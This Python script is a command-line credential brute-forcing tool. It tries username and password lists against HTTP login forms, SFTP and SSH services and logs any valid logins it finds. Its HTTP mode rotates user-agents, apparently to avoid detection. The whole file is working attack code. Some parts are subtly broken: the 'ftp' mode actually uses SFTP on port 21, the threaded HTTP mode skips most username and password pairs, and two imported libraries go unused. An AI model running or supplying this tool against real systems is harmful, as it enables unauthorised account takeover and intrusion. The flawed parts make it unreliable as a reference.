import argparse
import requests
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
import pytesseract
import threading
import time
import logging
import paramiko
import pysftp
from colorama import Fore, Style, init

# Initialize colorama
init()

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def http_brute_force(url, usernames, passwords, request_delay, verbose):
    # User-agent generator
    ua = UserAgent()

    def try_login(username, password):
        user_agent = ua.random
        headers = {"User-Agent": user_agent}
        data = {"username": username, "password": password}  # Modify these keys according to your form fields
        try:
            response = requests.post(url, data=data, headers=headers, timeout=5)
            if "success_message" in response.text:  # Modify this condition based on successful login response
                logging.info(f"{Fore.GREEN}Found valid credentials: {username}:{password}{Style.RESET_ALL}")
                return True
            else:
                if verbose:
                    logging.info(f"{Fore.RED}Invalid credentials: {username}:{password}{Style.RESET_ALL}")
                return False
        except requests.RequestException as e:
            if verbose:
                logging.info(f"{Fore.RED}Request error: {e}{Style.RESET_ALL}")
            return False

    def brute_force_batch(user_batch, password_batch):
        for username in user_batch:
            for password in password_batch:
                result = try_login(username, password)
                if result:
                    return

    def chunk_list(lst, chunk_size):
        for i in range(0, len(lst), chunk_size):
            yield lst[i:i + chunk_size]

    chunk_size = 10  # Adjust this value based on performance testing
    username_chunks = list(chunk_list(usernames, chunk_size))
    password_chunks = list(chunk_list(passwords, chunk_size))

    threads = []
    for i in range(min(len(username_chunks), len(password_chunks))):
        thread = threading.Thread(target=brute_force_batch, args=(username_chunks[i], password_chunks[i]))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def ftp_brute_force(host, usernames, passwords, port=21, request_delay=5, verbose=False):
    def try_login(username, password):
        try:
            with pysftp.Connection(host, username=username, password=password, port=port) as sftp:
                logging.info(f"{Fore.GREEN}Found valid credentials: {username}:{password}{Style.RESET_ALL}")
                return True
        except Exception as e:
            if verbose:
                logging.info(f"{Fore.RED}Invalid credentials: {username}:{password} - {e}{Style.RESET_ALL}")
            return False

    for username in usernames:
        for password in passwords:
            result = try_login(username, password)
            if result:
                return
            time.sleep(request_delay)

def ssh_brute_force(host, usernames, passwords, port=22, request_delay=5, verbose=False):
    def try_login(username, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=port, username=username, password=password, timeout=5)
            logging.info(f"{Fore.GREEN}Found valid credentials: {username}:{password}{Style.RESET_ALL}")
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            if verbose:
                logging.info(f"{Fore.RED}Invalid credentials: {username}:{password}{Style.RESET_ALL}")
            return False
        except Exception as e:
            logging.error(f"{Fore.RED}Connection error: {e}{Style.RESET_ALL}")
            return False

    for username in usernames:
        for password in passwords:
            result = try_login(username, password)
            if result:
                return
            time.sleep(request_delay)

def main():
    parser = argparse.ArgumentParser(description='Brute force tool for HTTP, FTP, and SSH')
    parser.add_argument('--http', action='store_true', help='Use HTTP brute force')
    parser.add_argument('--ftp', action='store_true', help='Use FTP brute force')
    parser.add_argument('--ssh', action='store_true', help='Use SSH brute force')
    parser.add_argument('-u', '--username', help='Single username')
    parser.add_argument('-U', '--username-file', help='Path to the username file')
    parser.add_argument('-p', '--password', help='Single password')
    parser.add_argument('-P', '--password-file', help='Path to the password file')
    parser.add_argument('-H', '--host', required=True, help='Target host')
    parser.add_argument('-d', '--delay', type=int, default=5, help='Request delay in seconds')
    parser.add_argument('--port', type=int, help='Port number')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode')

    args = parser.parse_args()

    usernames = []
    passwords = []

    if args.username:
        usernames.append(args.username)
    if args.username_file:
        with open(args.username_file, 'r') as f:
            usernames.extend(f.read().splitlines())

    if args.password:
        passwords.append(args.password)
    if args.password_file:
        with open(args.password_file, 'r') as f:
            passwords.extend(f.read().splitlines())

    if not usernames or not passwords:
        parser.error("At least one username and one password must be provided.")

    if args.http:
        http_brute_force(args.host, usernames, passwords, args.delay, args.verbose)
    elif args.ftp:
        ftp_brute_force(args.host, usernames, passwords, port=args.port or 21, request_delay=args.delay, verbose=args.verbose)
    elif args.ssh:
        ssh_brute_force(args.host, usernames, passwords, port=args.port or 22, request_delay=args.delay, verbose=args.verbose)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
